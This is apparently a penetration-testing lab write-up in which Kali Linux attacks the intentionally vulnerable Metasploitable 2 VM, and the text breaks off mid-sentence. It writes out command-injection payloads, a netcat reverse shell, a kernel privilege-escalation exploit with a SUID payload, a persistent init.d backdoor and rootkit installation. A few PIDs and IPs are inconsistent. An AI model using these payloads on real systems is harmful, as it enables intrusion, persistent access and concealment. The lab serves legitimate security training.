# Penetration-testing-lab-with-Kali-Linux-on-Metasploitable-2

## ⚠️ Disclaimer

This document details ethical hacking techniques strictly for educational purposes within a controlled, authorized virtual lab environment. Do not use this information against any system you do not own or have explicit permission to test; doing so is illegal. I assume no liability for misuse. The true goal is to teach defensive security against these threats.

## Purpose
The aim of this lab is to experience ethical hacking in a virtual environment composed of two virtual machines: an attacker machine running Kali Linux (an Advanced Penetration Testing Linux distribution used for Penetration Testing) and a victim host running Metasploitable 2 (an intentionally vulnerable Ubuntu Linux virtual machine designed for testing common vulnerabilities).
In this lab, I will:
* Lean the penetration testing methodology.
* Conduct port scanning and services enumeration on the target host.
* Brute force the login page of a web application.
* Exploit a command injection vulnerability on a vulnerable web server and gain an unprivileged access through a reverse shell execution.
* Escalate privilege and become root user on the vulnerable machine.
* Install a backdoor on the compromised host to maintain access.
* Hide traces on the victim system by installing and configuring a rootkit.

---

## 🛠️ Lab Setup
Two virtual hosts running Linux operating system are required to achieve this lab. The first is the attacker machine and is running **Kali Linux** (an Advanced Penetration Testing Linux distribution used for Penetration Testing). The second is the victim machine running **Metasploitable 2** (an intentionally vulnerable Ubuntu Linux virtual machine designed for testing common vulnerabilities). The two network adapters of these machines are attached to a **NAT Network**, so that they can communicate to each other and talk to outside (main host, local network, and internet).

![Network Architecture](/images/network.png)

---


### ⚙️ Lab Setup: Instaling Kali linux:

#### Step 1: Download the Pre-Built VM Image

1.  Navigate to the official Kali Linux virtual machine download page:
    * **Link:** `https://www.kali.org/get-kali/#kali-virtual-machines`
2.  Scroll to the **Pre-built VM** section.
3.  Select the download option corresponding to your virtualization platform (e.g., **VirtualBox**).
4.  Click **Download** to obtain the compressed file (usually a `.7z` or `.zip` archive).
5.  **Extract** the contents of the downloaded archive file. This will yield the `.vbox` and `.vdi` files for the VM.

#### Step 2: Import the VM into VirtualBox

1.  Open the **VirtualBox Manager**.
2.  Import the virtual machine using one of the following methods:
    * Click the **Add** machine icon (usually a blue `+` sign) and select the extracted **`.vbox`** configuration file.
    * Alternatively, **double-click** the extracted **`.vbox`** file directly from your file explorer.
3.  The Kali Linux VM instance will be automatically added to the VirtualBox list.



---

### 🎯 Lab Setup: Installing Metasploitable 2 VM

Metasploitable 2 is downloaded as a virtual hard disk file (`.vmdk`) that must be manually configured into a new VirtualBox machine.

#### Step 1: Download the VM Disk Image

1.  Navigate to the Metasploitable project files page on SourceForge:
    * **Link:** `https://sourceforge.net/projects/metasploitable/files/Metasploitable2/`
2.  Click the **Download** button for the latest Metasploitable 2 release.
3.  The file will download in a **ZIP format** and contains the virtual hard disk file (**.vmdk**).
4.  **Extract** the contents of the ZIP archive.

#### Step 2 Create and Configure the VM

1.  Open the **VirtualBox Manager**.
2.  Click the **New** button to create a new Virtual Machine.
3.  Configure the initial settings in the pop-up window:
    * **Name:** Choose a descriptive name (e.g., `Metasploitable-2`).
    * **Folder:** Leave as the default path unless a custom location is desired.
    * **Type:** **Linux**
    * **Version:** **Other Linux (64-bit)**
4.  Set the **Memory size (RAM)**. The recommended minimum is **512 MB**.
5.  In the **Hard Disk** section, select the option: **Use an existing virtual hard disk file**.
6.  Click the folder icon, then browse to and select the extracted **`.vmdk`** file from the Metasploitable 2 archive.
7.  Click **Create** to finalize the VM creation.

The Metasploitable 2 instance is now ready in the VirtualBox list.


### 🛠️ Lab Setup: Creating a Custom NAT Network

This procedure details the steps for configuring a dedicated **NAT Network** within your virtualization software (e.g., VirtualBox). This isolates your Kali Linux and Metasploitable 2 Virtual Machines (VMs) in a private network, facilitating safe and realistic penetration testing without exposing the lab environment to your host machine's primary network or the wider internet.

---

#### Step 1: Configure the Custom NAT Network

Follow these steps to define a new, isolated virtual network that both VMs will share.

1.  Navigate to the **VirtualBox Manager** application.
2.  Go to **File** $\rightarrow$ **Tools** $\rightarrow$ **Network Manager** (or simply press `Ctrl + H`).
3.  Select the **NAT Networks** tab.
4.  Click the **Create** icon (usually a **+** sign).
5.  A new NAT Network will be created with default settings.
    * **Recommendation:** **Rename** the network (e.g., `PenTest-Lab-Net`) for clear identification.
6.  Click **OK** to save and close the Network Manager.


#### Step 2: Assign VMs to the Custom NAT Network

You must configure both the Kali Linux and Metasploitable 2 VMs to use the network created in Step 1.

1.  In the VirtualBox Manager, select the **Kali Linux** VM.
2.  Click the **Settings** icon.
3.  Navigate to the **Network** category.
4.  In the **Adapter 1** tab:
    * Set the **Attached to:** option to **NAT Network**.
    * From the **Name** dropdown menu, select the custom network you created (e.g., `PenTest-Lab-Net`).
5.  Click **OK** to apply the settings for the Kali Linux VM.
6.  **Repeat steps 1 through 5** for the **Metasploitable 2** VM, ensuring it is also set to the *same* **NAT Network**.

## Penetration Testing Methodology

### Step 1: Information gathering

This step focuses on gathering essential network configuration data from the attacker machine (Kali Linux) using standard command-line tools. This information is crucial for planning subsequent penetration testing activities.

1.  **Start** both the **Kali Linux** and **Metasploitable 2** Virtual Machines.Log in to the **Kali Linux** attacker machine.(By default username: kali & password: kali) and open a terminal window and execute the following commands:

    * **To find the IP Address and Netmask:**
        ```bash
        ifconfig
        ```

    * **To find the Default Gateway Address:**
        ```bash
        netstat -r
        ```
    ![Kali Linux' ip](/images/ifconfig.png)
    ![Getway Address](/images/netstat_r_getway.png)

   In our case, the IP address of the attacker machine is 10.0.2.15, the IP network address is 10.0.2.0/24
   and the gateway IP address is 10.0.2.1.

2. Do a **Host Discovery Scan** on the entire target subnet to determine which hosts are currently online.
   
   From the terminal of the Kali Linux attacker machine, execute the following `nmap` command. We use the IP network address identified previously.

   ```bash
         nmap -sn 10.0.2.0/24
   ```
   ![Host Discovery](/images/host_discovery.png)
   
   Looking at the VirtualBox documentation, we can confirm the default address allocations for a custom NAT network, which helps identify the Metasploitable 2 target:

   | IP Address | Role in NAT Network |
   | :--- | :--- |
   | `10.0.2.2` | Host's Loopback Address |
   | `10.0.2.3` | DHCP Server |
   | `10.0.2.1` | Default Gateway |
   
   Since your `nmap` scan results confirmed:
   * **Attacker (Kali) Machine IP:** `10.0.2.15`
   * **Default Gateway IP:** `10.0.2.1`
   
   By elimination, the remaining active host found in the scan, **`10.0.2.4`**, is confirmed to be the **Target Machine (Metasploitable 2)**.

3. Do a **Service Discovery** on open ports after having successfully identified the target host's IP address , the next crucial phase is to perform a **port scan**. This determines which network services are running and accessible on the target machine.
   
   From the Kali Linux terminal, execute the following `nmap` command using the target IP address (e.g., `10.0.2.4`):

   ```bash
   sudo nmap -sS 10.0.2.4
   ```
   ![Service Discovery](/images/service_discovery.png)

   The scan output confirms 23 open ports. These ports host various network services (e.g., FTP, SSH, HTTP, MySQL, Telnet) which are often configured with known, exploitable vulnerabilities.

### Step 2: Ennumuration

   After obtaining a preliminary overview of the target, the attacker moves further to know the exact services running on the target system (including types and versions) and other information such as users, shares, and DNS entries. Enumeration prepares a clearer blueprint of the target.

1.  Nmap has a special flag to activate aggressive detection, namely `-A`, which enables **OS detection** ($-O$), **version detection** ($-sV$), **script scanning** ($-sC$), and **traceroute** ($--traceroute$). This mode sends more probes, providing a lot of valuable host information.

    Execute the aggressive detection using the following command:
    ```bash
      sudo nmap -A 10.0.2.4
    ```

    ![HTTP Service](/images/http.png)
    ![Target information](/images/host_infos.png)

   From the obtained results, we discovered that:
    * The OS installed on the target machine is **Linux 2.6**.
    * The kernel version is **`linux_kernel:2.6`**.
    * The hostname is **`metasploitable`**.
    * There is an **HTTP service** running on port 80, which is **`Apache/2.2.8 (Ubuntu) DAV/2`**.



2. After identifying the running web service on port 80, the next step is to access the service via a web browser to confirm the existence and nature of the web applications hosted on the target system.
   
   From the **Attacker Machine (Kali Linux)**, open the **Firefox** web browser.
   In the address bar, connect to the target system on port 80 by entering the following URL (using the identified target IP address):
       ```
       http://10.0.2.4
       ```
   ![HTTP Service](/images/web_service.png)
   
   You will notice the existence of several intentionally vulnerable web applications. We will focus specifically on **DVWA** (Damn Vulnerable Web Application), a PHP/MySQL application designed for educational purposes.
   Navigate to the DVWA login page:
       ```
       [http://10.0.2.4/dvwa/login.php](http://10.0.2.4/dvwa/login.php)
       ```
   
   

3. To systematically discover common security issues and potential vulnerabilities in the web application, we will employ the automated web vulnerability scanner, **Nikto** to scan the DVWA application and identify common misconfigurations, potentially dangerous files, and known vulnerabilities.


   Execute the `nikto` command from the Kali Linux terminal, specifying the target URL:
   
   ```bash
     nikto -h [http://10.0.2.4/dvwa](http://10.0.2.4/dvwa)
   ```
   ![HTTP Service](/images/nikto_scan.png)

   The scan reveal the existence of an accessible modification history file, such as CHANGELOG.txt.
   
4. From the **Attacker Machine (Kali Linux)**, open the Firefox browser and navigate directly to the file using the following URL:
    ```
    [http://10.0.2.4/dvwa/CHANGELOG.txt](http://10.0.2.4/dvwa/CHANGELOG.txt)
    ```
    ![HTTP Service](/images/changelog.png)
   
    A quick review of the file's content reveals development notes and modification history.This discovery is highly valuable, as the attacker now has a confirmed **valid username (`admin`)** for the target application, which simplifies the subsequent task of cracking or bypassing the authentication mechanism.

---
   
### 💥 Step 3: Gaining Access

The goal of this phase is to gain unauthorized access to the DVWA web application using the information gathered during the enumeration phase.



1. Having successfully identified a valid username (**`admin`**), we will now prepare to brute-force the login page to discover the corresponding password. The **Hydra** tool requires several pieces of information about the login process to execute the attack effectively.

   But we first need to provide the following data: 

   | Data Point | Value/Source | Notes |
   | :--- | :--- | :--- |
   | **Username** | `admin` | Found in the previous step via `CHANGELOG.txt` analysis. |
   | **Password Wordlist** | `/usr/share/wordlists/rockyou.txt.gz` | A common wordlist containing frequently used passwords. |
   | **Target Host** | `10.0.2.4` | The target Metasploitable 2 IP address. |
   | **HTTP Method** | *(To be determined)* | POST or GET. |
   | **Login Path** | `/dvwa/login.php` | The directory/path to the login script. |
   | **Request Body** | *(To be determined)* | The parameters used for username/password transmission. |
   | **Failure Identifier** | *(To be determined)* | A unique string on the login page indicating a failed attempt. |
   
   
   To determine the three missing pieces of information (HTTP Method, Request Body, and Failure Identifier), we must analyze the web application's login submission process:
   
   1.  Head back to the browser on the **Attacker Machine (Kali Linux)**.
   2.  Navigate to the DVWA login page: `http://10.0.2.4/dvwa/login.php`.
   3.  **Right-click** on the page and select **Inspect Element** (or similar, depending on the browser).
   4.  In the developer window that appears, select the **Network** tab.
   5.  To trigger a login request, type **`admin`** as the username, choose a **random password** (e.g., `invalid123`), and then click **Login**.
   6.  This login attempt will fail, but by looking at the recorded requests in the **Network** tab, we can observe the following critical detail:
       * **HTTP Method:** The submission uses the **POST** method to send credentials to the server.
  ![HTTP Method](/images/method.png) 
      
2. To accurately configure the brute-force attack, the **exact format and names of the fields** (the Request Body) used to transmit the username and password must be determined. This information is found within the failed login attempt request captured in the **Network** tab.

   To do This, in the browser's Developer Tools (still open to the **Network** tab), locate the failed **POST** request that was sent to `/dvwa/login.php`. **Right-click** on this request and select **Edit and Resend** (or similar option like 'View Source' or 'Payload' depending on the browser/tool) and examine the **Request Body** (or POST Data) section of the request.
   
   ![POST Payload](/images/payload.png)
   
   In this specific case, the request body is structured as a standard URL-encoded string containing three critical parameters:
   
   username=admin&password=test&Login=Login

3. We must now integrate the identified Request Body structure with Hydra's placeholder syntax.

   1.  Copy the determined Request Body:
       ```
       username=admin&password=test&Login=Login
       ```
   2.  Replace the placeholder password (`test` in our example) with the special token **`^PASS^`**. This token instructs Hydra to sequentially insert each word from the specified password wordlist into this position during the attack.
   3.  The final, modified request string for the Hydra command is:
   
       ```
       username=admin&password=^PASS^&Login=Login
       ```


4. To allow Hydra to reliably determine a successful login, we must specify the string that appears on the page only when a login **fails**. We previously observed that after a failed login attempt, the webpage displays the text **“Login failed”**. This specific string will be copied and pasted into the Hydra command as the **failure identifier**.

   ![Login Failed Text](/images/login_failed.png)

5. After identifying all the required components (Username, Wordlist, Target, Method, Path, Request Body, and Failure Indicator), we combine them into a single Hydra command.

   The general form for the HTTP POST Form module in Hydra is:
   
   ```bash
   sudo hydra -l <USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "<PATH>:<REQUEST_BODY>:<FAILURE_STRING>"
   ```

   After a short execution time, Hydra successfully identifies the correct password.



   ![Excuuting Hydra Command](/images/hydra.png)

**Credentials Found: admin/password**

6. The focus now shifts from authentication bypassing to finding and exploiting vulnerabilities within the authenticated section of the web application.

   To ensure the vulnerability is active for demonstration, the web application's security level must be explicitly set to the weakest configuration.
   
   Log in to DVWA using the cracked credentials (**`admin/password`**). Navigate to the **DVWA Security** page (usually found in the sidebar).Set the **Security Level** dropdown menu to **Low** then click **Submit** to save the changes.
   
   ![Excuuting Hydra Command](/images/dvwa_security.png)

7.We will now test the "Command Execution" module to understand how the web application processes user input.

   Navigate to the **Command Execution** page in the DVWA sidebar. In the input field, enter a public, known IP address (e.g., `8.8.8.8`).Click **Submit**.
   
   ![Excuuting Hydra Command](/images/cmd_injection.png)


8.The Linux command separator (semicolon `;`) allows multiple commands to be executed sequentially on a single line. We use this feature to confirm the presence of a **Command Injection** vulnerability.

The goal is to inject a second, non-ping command (`ls -l`) to prove that the user input is being executed directly by the operating system shell.

   1.  In the Command Execution input field, enter the following payload:
       ```
       8.8.8.8 ; ls -l
       ```
   2.  Click **Submit**.

   ![Excuuting Hydra Command](/images/cmdi_vulnerability.png)
      
   The output displays both the results of the initial `ping -c 3 8.8.8.8` and the directory listing generated by the injected command `ls -l`.


9. Exploiting this vulnerability allows us to run arbitrary commands, which can be used to gather critical information about the victim machine's user context, permissions, and internal configuration.

   **Goal:** Determine the username, User ID (UID), and Group ID (GID) under which the vulnerable web service is running.

   *  To determine the username, remotely inject the **`whoami`** command:
       ```bash
       8.8.8.8 ; whoami; id
       ```
   *  To determine the User ID and Group ID, remotely inject the **`id`** command:
       ```bash
       8.8.8.8 ; id
       ```
       * **Result:** This will output the effective username and the full user identity string, including the UID and GID (e.g., `uid=33(www-data) gid=33(www-data) groups=33(www-data)`).

    ![Excuuting Hydra Command](/images/exploiting_cmdi.png)
   
      

   This information is vital for understanding the attacker's privilege level on the victim system.

10. Obtaining a Reverse Shell:The objective of this phase is to establish a persistent, interactive command-line session (a **reverse shell**) on the victim machine. This method is more efficient for command execution than relying on the vulnerable web application interface.
    A **reverse shell** is a connection initiated by the victim machine back to the attacker machine, granting the attacker a shell session. We will use the versatile **Netcat (`nc`)** utility for this task.
    The first action is to prepare the attacker machine (Kali Linux) to **listen** for the incoming connection from the victim.
      1.  On the **Attacker Machine (Kali Linux)**, open a new terminal window.
      2.  Execute the following command to start the Netcat listener on port `1234`:
      ```bash
         nc -vv -l -p 1234
      ```


   | Option | Description |
   | :--- | :--- |
   | `nc` | The Netcat command-line utility. |
   | `-vv` | **Very Verbose.** Increases the verbosity level, providing detailed output of the connection status. |
   | `-l` | **Listen Mode.** Instructs Netcat to enter listening mode, waiting for an incoming connection rather than initiating one. |
   | `-p 1234` | **Port Specification.** Defines the specific TCP port (`1234`) on which the program will listen for the victim's connection. |

   The terminal will now display a message indicating it is listening, and it will remain active, waiting for the connection to be initiated from the victim in the next step.


11. With the Netcat listener active on the attacker machine, the next step is to use the Command Injection vulnerability to force the victim machine (Metasploitable 2) to connect back and establish the shell session.


   1.  Navigate back to the **Command Execution** page in DVWA.
   2.  In the input field, inject the following payload, using the semicolon (`;`) separator:
   
       ```bash
          8.8.8.8 ; nc -e /bin/sh 10.0.2.15 1234
       ```
   
   3.  Click **Submit**.

   | Command Part | Value | Description |
   | :--- | :--- | :--- |
   | `8.8.8.8 ;` | Separator | Executes the initial `ping` command, then executes the second command. |
   | `nc` | Netcat | Starts the Netcat utility on the victim machine. |
   | `-e /bin/sh` | Execute | Specifies the file to execute after a successful connection. This provides the attacker with an interactive shell (`/bin/sh`). |
   | `10.0.2.15` | Attacker IP | The IP address of the Kali Linux machine where the listener is running. |
   | `1234` | Listener Port | The specific port the attacker is listening on. |


   Immediately after submission:
   
   * On the **Attacker Machine (Kali Linux)**, the terminal running the Netcat listener (`nc -vv -l -p 1234`) will display a notification message showing a **successful connection** from the victim machine (`10.0.2.4`) to the attacker machine (`10.0.2.15`).
   * The attacker's shell window is now an interactive command prompt on the victim system.
   
   ![Excuuting Hydra Command](/images/nc.png)


12. With the reverse shell successfully established on the attacker machine, you now have direct, persistent access to the victim's command line. This allows for rapid and efficient enumeration of the host system.


   In the opened reverse shell window on the Kali Linux machine, we could execute the following command:
   
   * `lsb_release -a` $\rightarrow$ Provides detailed **distribution and release information** for the operating system.
   
   ![Excuuting Hydra Command](/images/nc_listening.png)


   Based on the execution of these commands on the Metasploitable 2 target, you should obtain the following key results:

   **System Distribution and Kernel Version of the Victim Host:**
    * **Distribution:** **Ubuntu**
    * **Kernel Version:** The output of `uname -a` will show a version string typically starting with **`2.6.24`** or similar (confirming the findings from the earlier `nmap -A` scan). The output of `lsb_release -a` will confirm the full distribution name, such as `Ubuntu 8.04`.

13. Having gained a user-level shell (running as `www-data`), the next critical step is to assess the current privilege level and determine if **privilege escalation** is necessary to achieve full control of the victim system.

   To prove that the current user lacks enough privileges for high-level system access, attempt to read a highly restricted, root-owned system file: `/etc/shadow`.



   In the opened reverse shell window on the Kali Linux attacker machine, execute the following command:
    ```bash
       cat /etc/shadow
    ```

    
   ![Excuuting Hydra Command](/images/privilege_missing.png)

   * The command will **fail**.
   * **No content** from the `/etc/shadow` file will be displayed in the terminal.
   * The shell may immediately return to the prompt or display a "Permission denied" error (though often in a non-interactive shell like this, it simply produces no visible output).

   The execution failure confirms that the current user (`www-data`) does not have the necessary permissions (i.e., is **not root**) to read protected system files.


---

### ⬆️ Step 4: Escalating Privileges

Having confirmed that the current shell runs with insufficient privileges (`www-data`), the focus shifts to **Privilege Escalation**. This is typically achieved by exploiting known vulnerabilities in the victim's operating system kernel or installed software.


1. The target's operating system and kernel version are confirmed as **Linux 2.6.24** running on **Ubuntu 8.04**. We use this specific version information to search public exploit databases for a suitable vulnerability.


   Several methods can be used to search for exploits, including:
   * Searching with the open-source tool **`searchsploit`** (installed on Kali Linux).
   * Searching directly on the **Exploit-DB.com** website.
   * Searching using a general search engine like Google.



   We execute a refined `searchsploit` command on the Kali terminal to filter the large database specifically for Linux kernel 2.6 privilege escalation exploits:
   
   ```bash
      searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
   ```
   
   ![Excuuting Hydra Command](/images/search_for_vuln.png)


   Among the available exploit we will select the file 8572.c which exploits a vulnerability in the UDEV device manager that allows code execution via an unverified Netlink message.

2. Before using the exploit, its exact location on the attacker machine must be determined. Exploit files found via `searchsploit` are typically stored in the `/usr/share/exploitdb/exploits/` directory.


   1.  First, ensure the local file database is up-to-date for accurate searching:
      
       ```bash
            sudo updatedb
       ```
   2.  Next, use the `locate` command to find the file:
      
       ```bash
           locate 8572.c
       ```


   It is a crucial security practice to review the contents of any exploit code before compilation and execution. This allows the attacker to understand the exploit's functionality, dependencies, and any specific instructions from the author.


   Use the `cat` command with the full path to display the source code:
    
    ```bash
      cat /usr/share/exploitdb/exploits/linux/local/8572.c
    ```

    ![Excuuting Hydra Command](/images/8572_content.png)


   The compiled C exploit file (`8572.c`) must be transferred from the Attacker Machine (Kali) to the Victim Machine (Metasploitable 2) for local execution. The simplest method is using the **HTTP protocol** by momentarily serving the file from Kali's internal web server.


3. The Kali Linux machine includes the **Apache2** web server, which we will use to temporarily host the exploit file.

   1.  Start the Apache2 service:
      
       ```bash
         sudo service apache2 start
       ```
   2.  Check the service status to ensure it is running correctly:
      
       ```bash
         sudo service apache2 status
       ```

       ![Excuuting Hydra Command](/images/start_apache2.png)
    

   The exploit file is currently located deep within the `/usr/share/exploitdb/` directory. We will create a **symbolic link** to make it accessible within the Apache document root (`/var/www/html`).

   Create a symbolic link named `local` inside the web root, pointing to the directory containing the exploit:
    
    ```bash
      sudo ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html
    ```
    
    **Result:** The exploit file is now accessible via the URL `http://10.0.2.15/local/8572.c`.



4. The chosen UDEV exploit (`8572.c`) requires specific file paths to execute its payload. The exploit is designed to execute the file `/tmp/run` with root privileges.

   1.  Before downloading the exploit, use the **reverse shell** to change the working directory on the victim machine to the temporary directory `/tmp`.
      
       ```bash
        cd /tmp
       ```
       
   3.  Confirm the directory change:
      
       ```bash
         pwd
       ```
       
       ![Excuuting Hydra Command](/images/change_dir.png)


5. Using the Command Injection vulnerability (which is still active via the reverse shell), instruct the victim machine to download the exploit using the `wget` utility.

   Execute the following commands in the **reverse shell window**:

    ```bash
        wget [http://10.0.2.15/local/8572.c](http://10.0.2.15/local/8572.c)
        ls -al 8572.c
    ```
   
   ![Excuuting Hydra Command](/images/install_8572.png)



6.  The downloaded file (`8572.c`) is C source code and must be compiled into a binary executable file before it can be run on the victim system.

   1.  Use the `gcc` compiler on the reverse shell (still in the `/tmp` directory) to compile the code:
      
       ```bash
         gcc -o exploit 8572.c
       ```
       
       * **`gcc`:** The GNU Compiler Collection.
       * **`-o exploit`:** Specifies the output file name as `exploit`.
         
   2.  Verify the compilation was successful and check the file permissions:
      
       ```bash
         ls -al exploit
       ```
       
       ![Excuuting Hydra Command](/images/cvt_8572_2_compiled.png)
    

7. Determining the Target Process ID (PID)

The UDEV exploit requires the Process ID (PID) of the **Netlink socket** as an argument. The exploit documentation indicates this PID is usually $\text{UDEVD PID} - 1$.

   1.  Read the content of the Netlink status file to find the non-zero PID:
      
       ```bash
         cat /proc/net/netlink
       ```
       ![Excuuting Hydra Command](/images/PID_netlink_socket.png)
       
       Locate the only non-zero PID displayed. In this example, the required PID is **`2420`**.
   
   2.  Verify the PID by checking the running UDEVD process:
      
       ```bash
         ps aux | grep udev
       ```
       
       ![Excuuting Hydra Command](/images/PID_udev_process.png)
       
       * **Observation:** The PID of the `udevd` process should be `2421`, which is one greater than the identified Netlink PID (`2420`). This confirms the target PID for the exploit.

8. Creating the Privilege Escalation Payload

   The `8572.c` exploit is designed to execute the file `/tmp/run` with root privileges. Therefore, we must create this file and populate it with the commands we want executed as root.

**Goal:** Create `/tmp/run` to set the **SUID bit** on a copy of the shell, ensuring any future execution of that copy runs as root.

9.  Create and populate the `/tmp/run` file using `echo` and redirection:
    
       ```bash
         echo "#!/bin/bash" > /tmp/run
         echo "cp /bin/bash /bin/myshell" >> /tmp/run
         echo "chmod +s /bin/myshell" >> /tmp/run
       ```
       
       * The payload copies the `/bin/bash` shell to a new file, `/bin/myshell`.
       * It then sets the **SUID bit** (`chmod +s`) on `/bin/myshell`. When a file with the SUID bit is run by any user, it executes with the privileges of the file's owner (which will be `root` once the exploit runs).
   
10.  Display the content of the created payload file for verification:
    
       ```bash
         cat /tmp/run
       ```
      ![Excuuting Hydra Command](/images/creat_run.png)

11. With the executable compiled and the payload created, the final step is to execute the exploit using the identified Netlink PID as the argument.

    Execute the exploit binary:
    
    ```bash
      ./exploit 2410
    ```
    * **Result:** The exploit runs, leverages the UDEV vulnerability, and successfully executes the `/tmp/run` script with root privileges. This means `/bin/myshell` now exists and has the SUID bit set by the root user.


12. Before execution, verify the attributes of the shell copied and modified by the payload (`/tmp/run`).


    Execute the following command in the reverse shell:
    
    ```bash
      ls -al /bin/myshell
    ```
    
     ![Excuuting Hydra Command](/images/exc_exploit.png)

   * **Observation:** The output confirms the following critical attributes:
       * **Owner:** The file is owned by **`root`**.
       * **Permissions/SUID:** The permission string will show an **`s`** where the owner's execute permission is located (e.g., `-rwsr-xr-x`). This letter confirms the **setuid (SUID) attribute** is successfully set. 

13. The SUID shell must be executed with a specific option to prevent the Linux kernel from automatically dropping the elevated privileges.

**Goal:** Run the new shell and maintain the root effective user ID.

 Execute the SUID shell with the **`-p`** option:
    ```bash
         /bin/myshell -p
    ```
    * **`-p` Option:** This flag is crucial; it prevents the shell from reverting the **effective GID and UID** back to the real (low-privilege) GID and UID, thereby preserving the root privilege.


14. After executing the SUID shell, the session should now be running with the highest possible privileges.

    Execute the following commands in the newly opened shell session:
    
    ```bash
         id
         whoami
    ```
   ![Excuuting Hydra Command](/images/verify_exploit_works.png)

   * **Final Result:**
       * The output of **`whoami`** will be **`root`**.
       * The output of **`id`** will show **`uid=0(root)`** and **`gid=0(root)`**.

   This confirms that the privilege escalation was successful, and the attacker now has complete control of the Metasploitable 2 victim system.
   
15. While the execution of `/bin/myshell -p` successfully elevated the Effective User ID (EUID) to `root` (UID 0), the shell environment itself might still be limited or unstable. Generally, the **EUID mirrors the Real User ID (RUID)**, except when a **SetUID binary** is executed, which temporarily elevates the EUID.

    To ensure a persistent and fully functional shell environment with guaranteed root privileges, we will execute a final command using Python.

    This command imports the `os` module in Python to explicitly set both the Real and Effective User IDs to `0` (`root`), and then executes a persistent Bash shell (`/bin/bash -p`).
    
   **Goal:** Establish a permanent, stable, and fully privileged Bash session by explicitly setting the UID to 0.
    In the current root-privileged shell session, execute the following Python command:
   
    ```bash
       python -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
    ```
   
   | Command Part | Function | Significance |
   | :--- | :--- | :--- |
   | `python -c` | Execute code | Executes the following commands directly via the Python interpreter. |
   | `import os;` | Import module | Imports the standard operating system interface module. |
   | `os.setuid(0);` | Set UID to Root | **Crucially sets the Real User ID (RUID) to 0 (root).** This ensures the session is no longer merely using an *effective* ID, but a *real* root ID. |
   | `os.system("/bin/bash -p")` | Execute Shell | Executes a new Bash shell. The **`-p`** flag ensures that the shell retains the privileges granted by the SetUID mechanism (in this case, the `os.setuid(0)` call). |
   
   
   ![Excuuting Hydra Command](/images/python.png)
   
   You now have a stable, full-featured Bash shell running with the highest possible privilege level (`root`). You can proceed with any post-exploitation activities.

---
### 🔓 Step 5: Maintaining Access (Persistence Mechanism)

In this step we will establish a persistent connection method on the victim machine. This ensures the ability to reconnect to the host even after the system reboots, which is critical for continued learning and analysis in a controlled lab environment.

1. We will create a script that forces Netcat to listen continuously on a specified port, effectively creating a backdoor that runs as a system service.

   Create the script file (listener.sh) in the system initialization directory (/etc/init.d/).

   Use the opened root shell to write the contents to the file:

   ```bash
         echo "#!/bin/bash" > /etc/init.d/listener.sh
         echo "(while true; do nc -l -v -p 5005 -e /bin/bash; done) &" >> /etc/init.d/listener.sh
   ```
   
   
    > **Note:** Netcat does not create persistent connections by default. The while true; do ... done loop ensures the listener restarts immediately if the connection is                        closed, and the & runs the process in the background. It listens on port 5005 and executes a Bash shell (-e /bin/bash) upon connection.
   
2. The system requires the script to have execute permissions to be recognized and run as a service.

   Set the execute permission on the script file:
   
    ```bash
         chmod +x /etc/init.d/listener.sh
    ```
   
   
3. Confirm that the script was created correctly with the required permissions.

Display the attributes and content of the script file:

```bash
         ls -al /etc/init.d/listener.sh
         cat /etc/init.d/listener.sh
```

   ![Excuuting Hydra Command](/images/python.png)

4. The update-rc.d utility is used to integrate the script into the system's startup sequence (SysVinit on Metasploitable 2), making it execute during every boot.

   Configure listener.sh to run at the default system startup runlevels:
   
   ```bash
       sudo update-rc.d listener.sh defaults
   ```
   
   ![Excuuting Hydra Command](/images/persistent_bd.png)

5. To confirm that the script has been successfully registered, we check the runlevel directory, which contains symbolic links to all services that start at a given runlevel.

List the services configured to start at boot (Runlevel 3):

   ```bash
           ls -x /etc/rc3.d
   ```

   ![Excuuting Hydra Command](/images/startup.png)


---


### 🕵️ Step 6: Covering Tracks (Rootkit Installation Analysis)

The actions executed during privilege escalation leave many traces on the compromised system (e.g., the `listener.sh` script, port 5005, and running processes). The objective of this step is to document the process intended to hide these traces by installing a **Rootkit**

1. A security analyst can easily observe the active persistence mechanism using standard utilities like netstat.
   Remotely execute a command on the victim machine to confirm the running backdoor trace using the following command

   ```bash
       netstat -taun | grep 5005
   ```
   
   ![Excuuting Hydra Command](/images/track.png)
   The output shows the persistent Netcat process actively LISTENING on TCP port 5005.


2. To hide these traces, we will install a Rootkit from **https://packetstormsecurity.com/** web site (an information security website offering current and historical computer security tools, exploits, and security advisories) on the victim’s machine.

   First, we will download the rootkit file (from Internet) on the attacker’s host (under the directory/home/kalilinux/Downloads).

   Open a new terminal and type the following commands:
   
    ```bash
       cd /home/kalilinux/Downloads
       wget https://dl.packetstormsecurity.net/UNIX/penetration/rootkits/fk.tgz
   ```

    ![Excuuting Hydra Command](/images/download_rootkit.png)
    
4. On the attacker’s machine, create a hard copy of the rootkit files in the web server file directory of the attacker machine, so that you can transfer it via HTTP to the victim’s host. using the following command:
   
   ```bash
       cp /home/kali/Downloads/fk.tgz /var/www/html
   ```

5. Go back to the last opened remote shell window (on the victim machine, port 5005). Change
directory to /tmp and download the rootkit file from the attacker’s machine. Then verify that the
rootkit has been successfully downloaded and extract it on the victim host.

   ```bash
       cd /tmp
      wget http://10.0.2.15/fk.tgz
      ls -al fk.tgz
      tar zvfx fk.tgz
   ```

   > **note :** if you turned off your machine after the last time you start the apache2 service(step4.3) you need to restart it again using :
   > ```bash
         sudo service apache2 start
         sudo service apache2 status
     ```

  ![Excuuting Hydra Command](/images/download_rootkit2victim.png)

6. Before proceeding with the installation of any low-level software like a rootkit, always take a snapshot of the Metasploitable VM. This allows you to revert the system to a clean state instantly, preventing irreversible damage.
   Go to machine tab > Take a snapshot
   

7. Move to fk-0.4 directory and display the content of README file to identify the files that need to be
configured to hide ports and programs on the victim host.

   ```bash
       cd fk-0.4
       cat README
   ```

   ![Excuuting Hydra Command](/images/readme.png)

8. The final intended step is to execute the installation script, which performs kernel-level hooking to hide processes, files, and network connections.

   ```bash
       ./install
   ```

   ![Excuuting Hydra Command](/images/install_rootkit.png)

9. In the terminal window, enter this command to display the list of active connections and the
associated ports and IP addresses

   ```bash
       netstat --protocol=inet 
   ```

   ![Excuuting Hydra Command](/images/netstat_protocol.png)


   You can observe from this figure that the victim’s host (10.0.2.5) listening on port 5005 is connected
   to the victim’s machine (10.0.2.7) on port 38264.
   Configure the rootkit to avoid displaying the locally opened port 5005 (used to run the backdoor) on
